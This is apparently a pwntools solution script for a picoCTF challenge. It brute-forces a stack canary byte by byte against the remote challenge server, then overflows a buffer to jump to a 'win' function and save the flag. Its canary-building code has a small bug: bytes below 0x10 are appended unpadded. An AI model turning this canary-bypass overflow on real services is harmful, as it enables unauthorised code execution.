from pwn import *

context.update(arch='i386', os='linux', endian='little') #context acquired from file command

elf =  ELF("./vuln")

offset = 64
offset_after_canary = 16

#exploit for local with known canary
# payload = [
#     b"A"*offset,
#     b"test", #canary
#     b"A"*offset_after_canary,
#     pack(elf.symbols['win'])
# ]

#bruteforcing the canary since it doesn't change
canary = ""
for _ in range(4):
    for i in range(0xff+1):

        with context.quiet:
            p = remote("saturn.picoctf.net", 55924) #ports vary between different instances launched
            # p = elf.process()

            #(int to hex string, remove 0x, and then zero pad it to 2 digits)
            bytes_to_try = bytes.fromhex(canary) + bytes.fromhex(hex(i)[2:].zfill(2))

            hex
            payload = [
                b"A"*offset,
                bytes_to_try #canary 
            ]

            #to allow just enough input to crack each byte of the canary
            p.sendline(f"{offset + len(canary)//2 + 1}".encode("utf-8"))
            p.sendline(b"".join(payload))

            output = p.recvall().decode()

            if(not "Stack Smashing Detected" in output):
                canary += hex(i)[2:]
                break
            p.close()


log.info("CANARY FOUND")
print(bytes.fromhex(canary))
log.info("RUNNING ATTACK")

p = remote("saturn.picoctf.net", 55924) #ports vary between different instances launched
# p = elf.process()

payload = [
    b"A"*offset,
    bytes.fromhex(canary), #canary
    b"A"*offset_after_canary,
    pack(elf.symbols['win'])
]


print(b"".join(payload))
print(f"{offset + len(canary)//2 + offset_after_canary}".encode("utf-8"))

p.sendline(b"1000")
p.sendline(b"".join(payload))

flag = p.recvline_endswithS('}')
p.close()

print(flag)

with open("picoflag.txt", "w") as f:
    f.write(flag)